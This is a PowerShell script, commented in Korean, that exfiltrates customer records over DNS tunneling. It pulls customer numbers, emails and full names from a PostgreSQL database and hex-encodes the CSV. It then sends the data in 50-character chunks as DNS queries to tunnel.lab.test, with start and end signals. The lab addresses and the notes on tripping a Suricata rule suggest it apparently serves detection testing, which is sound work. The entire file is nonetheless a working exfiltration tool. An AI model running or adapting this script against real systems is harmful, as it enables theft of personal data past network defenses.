# DNS 터널링 유출 - Win10 송신 스크립트 (PostgreSQL DB 버전)
# 사용법: .\win10_exfil.ps1 -DbPassword "비밀번호"
# 환경: 내부망 192.168.100.0/24 / DNS 192.168.100.53

param(
    [string]$DnsServer  = "192.168.100.53",
    [string]$Domain     = "tunnel.lab.test",
    [int]   $DelayMs    = 100,   # 100ms 간격 → 10초에 ~100회 (탐지 임계 초과)
    # DB 접속
    [string]$DbHost     = "192.168.100.30",
    [int]   $DbPort     = 5433,
    [string]$DbUser     = "business_reader",
    [string]$DbName     = "honeygen_5",
    [Parameter(Mandatory)][string]$DbPassword,
    [int]   $PageSize   = 200,
    [string]$SortBy     = "cno"
)

# ── 1. DB 조회 → CSV 바이트 ──────────────────────────────────
$psqlExe = 'C:\Program Files\PostgreSQL\19\bin\psql.exe'
if (-not (Test-Path $psqlExe)) {
    Write-Error "psql.exe를 찾을 수 없음: $psqlExe"
    exit 1
}

$sqlQuery = "COPY (SELECT cno,email,full_name FROM public.read_customers('$SortBy',false,$PageSize,0)) TO STDOUT WITH CSV HEADER"

$env:PGPASSWORD = $DbPassword
$csvLines = & $psqlExe -h $DbHost -p $DbPort -U $DbUser -d $DbName -X -c $sqlQuery
$exitCode = $LASTEXITCODE
$env:PGPASSWORD = $null

if ($exitCode -ne 0) {
    Write-Error "DB 조회 실패 (종료 코드 $exitCode)"
    exit 1
}

$csvText = $csvLines -join "`n"
$bytes   = [System.Text.Encoding]::UTF8.GetBytes($csvText)
$hex     = -join ($bytes | ForEach-Object { $_.ToString("x2") })

Write-Host "[*] DB    : $DbHost`:$DbPort/$DbName  계정: $DbUser"
Write-Host "[*] 행 수 : $($csvLines.Count - 1)  ($($bytes.Length) bytes)"

# ── 2. 청크 분할 ─────────────────────────────────────────────
# DNS 레이블 최대 63자 / seq(4) + data(50) = 54자 → Suricata "50자 이상" 탐지 트리거
$CHUNK = 50
$chunks = [System.Collections.Generic.List[string]]::new()
for ($i = 0; $i -lt $hex.Length; $i += $CHUNK) {
    $chunks.Add($hex.Substring($i, [Math]::Min($CHUNK, $hex.Length - $i)))
}

Write-Host "[*] 청크수: $($chunks.Count) (레이블 길이 ~54자)"
Write-Host "[*] DNS   : $DnsServer  /  도메인: $Domain"

# ── 3. 세션 시작 신호 ────────────────────────────────────────
# 형식: start{총청크수:04x}{파일크기:04x}.tunnel.lab.test
$startLabel = "start{0:x4}{1:x4}" -f $chunks.Count, $bytes.Length
Resolve-DnsName -Name "$startLabel.$Domain" -Server $DnsServer -Type A `
    -ErrorAction SilentlyContinue | Out-Null
Write-Host "[>] START 신호 전송: $startLabel.$Domain"
Start-Sleep -Milliseconds $DelayMs

# ── 4. 데이터 청크 전송 ──────────────────────────────────────
# 형식: {seq:04x}{hex50자}.tunnel.lab.test
for ($i = 0; $i -lt $chunks.Count; $i++) {
    $label    = "{0:x4}{1}" -f $i, $chunks[$i]
    $dnsQuery = "$label.$Domain"
    Write-Host "[>] [$($i+1)/$($chunks.Count)] $dnsQuery"
    Resolve-DnsName -Name $dnsQuery -Server $DnsServer -Type A `
        -ErrorAction SilentlyContinue | Out-Null
    Start-Sleep -Milliseconds $DelayMs
}

# ── 5. 세션 종료 신호 ────────────────────────────────────────
$endLabel = "end{0:x4}" -f $chunks.Count
Resolve-DnsName -Name "$endLabel.$Domain" -Server $DnsServer -Type A `
    -ErrorAction SilentlyContinue | Out-Null
Write-Host "[+] END 신호 전송: $endLabel.$Domain"
Write-Host "[+] 유출 완료."
